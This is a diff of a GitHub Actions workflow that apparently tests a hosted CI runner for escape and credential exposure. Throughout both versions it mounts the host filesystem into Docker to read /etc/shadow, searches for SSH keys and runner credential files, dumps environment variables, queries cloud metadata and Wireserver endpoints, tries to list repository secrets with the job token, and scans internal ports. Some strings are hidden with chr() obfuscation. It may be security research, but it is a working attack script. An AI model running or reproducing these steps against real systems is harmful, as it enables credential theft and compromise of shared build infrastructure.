@@ -1,74 +1,76 @@
-name: Deep Token and Escape Test
+name: Focused Escape Test
 
 on:
   workflow_dispatch:
 
+permissions:
+  contents: read
+  actions: read
+
 jobs:
-  deep-test:
+  escape:
     runs-on: ubuntu-latest
     steps:
-      - name: Token and Escape Tests
-        env:
-          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      - name: Container Escape and Token Tests
         run: |
-          echo "=== TEST 1: GITHUB_TOKEN JWT decode ==="
-          echo "$GITHUB_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>&1 || echo "not a JWT"
+          echo "=== 1. Docker host mount ==="
+          docker run --rm -v /:/hostfs:ro alpine sh -c "cat /hostfs/etc/shadow" 2>&1 | head -10
           echo ""
-          echo "=== TEST 2: Git clone private repo with GITHUB_TOKEN ==="
-          git clone https://x-access-token:${GITHUB_TOKEN}@github.com/test4100test-cloud/private-secret-test.git /tmp/private-clone 2>&1 || echo "BLOCKED"
-          if [ -d /tmp/private-clone ]; then
-            echo "CLONE SUCCEEDED!"
-            ls -la /tmp/private-clone/
-            cat /tmp/private-clone/SECRET_DATA.md 2>&1
+          echo "=== 2. Host sensitive files ==="
+          docker run --rm -v /:/hostfs:ro alpine sh -c "find /hostfs/root /hostfs/home -name id_rsa -o -name id_ed25519 -o -name .ssh -type d 2>/dev/null | head -20"
+          docker run --rm -v /:/hostfs:ro alpine sh -c "ls -la /hostfs/root/.ssh/ 2>/dev/null || echo no-root-ssh"
+          docker run --rm -v /:/hostfs:ro alpine sh -c "cat /hostfs/home/runner/actions-runner/.runner 2>/dev/null || echo no-runner-file"
+          docker run --rm -v /:/hostfs:ro alpine sh -c "cat /hostfs/home/runner/actions-runner/.credentials 2>/dev/null || echo no-creds"
+          echo ""
+          echo "=== 3. Runner agent config ==="
+          ls -la /home/runner/actions-runner/ 2>&1 | head -20
+          cat /home/runner/actions-runner/.runner 2>&1 || echo "no .runner"
+          cat /home/runner/actions-runner/.credentials 2>&1 || echo "no .credentials"
+          echo ""
+          echo "=== 4. All env vars (security relevant) ==="
+          env | sort | head -80
+          echo ""
+          echo "=== 5. GITHUB_TOKEN API tests ==="
+          curl -s -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/repos/test4100test-cloud/sec-test/actions/secrets 2>&1
+          echo ""
+          curl -s -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/installation/repositories 2>&1 | head -20
+          echo ""
+          echo "=== 6. Orchestrator tags ==="
+          TAGS=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance/compute/tagsList?api-version=2021-02-01")
+          echo "$TAGS"
+          echo ""
+          echo "=== 7. Orchestrator API ==="
+          RO_URL=$(echo "$TAGS" | python3 -c "import sys,json;d=json.load(sys.stdin);[print(t[chr(118)+chr(97)+chr(108)+chr(117)+chr(101)]) for t in d if chr(98)+chr(97)+chr(115)+chr(101) in t.get(chr(110)+chr(97)+chr(109)+chr(101),chr(32))]" 2>/dev/null || echo "")
+          echo "RO_URL=$RO_URL"
+          if [ -n "$RO_URL" ]; then
+            curl -s --connect-timeout 5 "$RO_URL" 2>&1 | head -5
+            curl -s --connect-timeout 5 "${RO_URL}/health" 2>&1 | head -5
+            curl -s --connect-timeout 5 "${RO_URL}/status" 2>&1 | head -5
           fi
           echo ""
-          echo "=== TEST 3: Git fetch specific SHA ==="
-          git ls-remote https://x-access-token:${GITHUB_TOKEN}@github.com/test4100test-cloud/private-secret-test.git 2>&1 | head -5 || echo "BLOCKED"
+          echo "=== 8. Wireserver ==="
+          curl -s --connect-timeout 3 "http://168.63.129.16/machine?comp=goalstate" -H "x-ms-version: 2012-11-30" 2>&1 | head -30
+          curl -s --connect-timeout 3 "http://168.63.129.16:32526/status" 2>&1 | head -5
           echo ""
-          echo "=== TEST 4: GraphQL with GITHUB_TOKEN ==="
-          curl -s -H "Authorization: bearer $GITHUB_TOKEN" \
-            -X POST https://api.github.com/graphql \
-            -d "{"query":"{viewer{login repositories(first:10){nodes{name isPrivate}}}}"}" 2>&1 | head -20
+          echo "=== 9. SSH keys scan ==="
+          find / -maxdepth 4 -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null | head -10
+          find / -maxdepth 4 -name "*.pem" -not -path "*/ssl/*" -not -path "*/certs/*" 2>/dev/null | head -10
           echo ""
-          echo "=== TEST 5: List all repos accessible to token ==="
-          curl -s -H "Authorization: token $GITHUB_TOKEN" \
-            "https://api.github.com/installation/repositories?per_page=100" 2>&1 | head -30
+          echo "=== 10. Docker privileged test ==="
+          docker run --rm --privileged alpine sh -c "echo PRIVILEGED_OK; mount | head -5" 2>&1 | head -10
           echo ""
-          echo "=== TEST 6: API path traversal ==="
-          curl -s -H "Authorization: token $GITHUB_TOKEN" \
-            "https://api.github.com/repos/test4100test-cloud/sec-test/../private-secret-test/contents/" 2>&1 | head -10
+          echo "=== 11. Network scan ==="
+          for port in 80 443 8080 8443 9090 3000 5000; do
+            timeout 2 bash -c "echo >/dev/tcp/10.1.0.1/$port" 2>/dev/null && echo "10.1.0.1:$port OPEN" || true
+          done
           echo ""
-          echo "=== TEST 7: Actions API ==="
-          curl -s -H "Authorization: token $GITHUB_TOKEN" \
-            "https://api.github.com/repos/test4100test-cloud/sec-test/actions/secrets" 2>&1 | head -10
+          echo "=== 12. Api-proxy image deep inspect ==="
+          docker create --name aproxy ghcr.io/github/gh-aw-firewall/api-proxy:latest 2>&1
+          docker cp aproxy:/ /tmp/aproxy-root 2>&1 || echo "cp failed"
+          find /tmp/aproxy-root -maxdepth 3 -type f -name "*.go" -o -name "*.py" -o -name "*.sh" -o -name "*.conf" -o -name "*.yml" -o -name "*.yaml" -o -name "*.json" -o -name "*.toml" 2>/dev/null | head -30
           echo ""
-          echo "=== TEST 8: Environment variables ==="
-          env | sort | grep -iE "TOKEN|SECRET|KEY|AUTH|PASS|CRED|ACTIONS|GITHUB|RUNNER|AZURE|AWS" | head -30
-          echo ""
-          echo "=== TEST 9: Hosted Compute Orchestrator with allocation ID ==="
-          ALLOC_ID=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 | python3 -c "import sys,json; d=json.load(sys.stdin); tags=d.get("compute",{}).get("tagsList",[]); [print(t["value"]) for t in tags if "allocation_id" in t.get("name","")]" 2>/dev/null)
-          echo "Allocation ID: $ALLOC_ID"
-          RO_URL=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 | python3 -c "import sys,json; d=json.load(sys.stdin); tags=d.get("compute",{}).get("tagsList",[]); [print(t["value"]) for t in tags if "base_ro_url" in t.get("name","")]" 2>/dev/null)
-          echo "RO URL: $RO_URL"
-          if [ -n "$RO_URL" ] && [ -n "$ALLOC_ID" ]; then
-            echo "--- Orchestrator with allocation ---"
-            curl -s --connect-timeout 5 "$RO_URL/$ALLOC_ID" 2>&1 | head -10
-            curl -s --connect-timeout 5 "$RO_URL/status" 2>&1 | head -10
-            curl -s --connect-timeout 5 "$RO_URL/health" 2>&1 | head -10
-          fi
-          echo ""
-          echo "=== TEST 10: Docker container escape ==="
-          echo "--- Mount host root into container ---"
-          docker run --rm -v /:/hostfs:ro alpine cat /hostfs/etc/shadow 2>&1 | head -5
-          echo "--- Runner agent directory ---"
-          ls -la /home/runner/actions-runner/ 2>&1 | head -15
-          cat /home/runner/actions-runner/.runner 2>&1 || echo "no .runner file"
-          echo ""
-          echo "=== TEST 11: Scan for private SSH keys ==="
-          find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" -o -name "id_ecdsa" 2>/dev/null | head -10
-          echo ""
-          echo "=== TEST 12: Access Azure Wireserver for certificates ==="
-          curl -s --connect-timeout 3 "http://168.63.129.16/machine/Plugins/?comp=config&type=hostingEnvironmentConfig&incarnation=1" -H "x-ms-version: 2012-11-30" 2>&1 | head -20
-          curl -s --connect-timeout 3 "http://168.63.129.16:32526/status" 2>&1 | head -10
+          echo "=== 13. Api-proxy entrypoint ==="
+          docker cp aproxy:/usr/local/bin/entrypoint.sh /tmp/ap-entry.sh 2>&1 || echo "no entrypoint"
+          cat /tmp/ap-entry.sh 2>&1 | head -60 || echo "no file"
           echo ""
           echo "=== Complete ==="
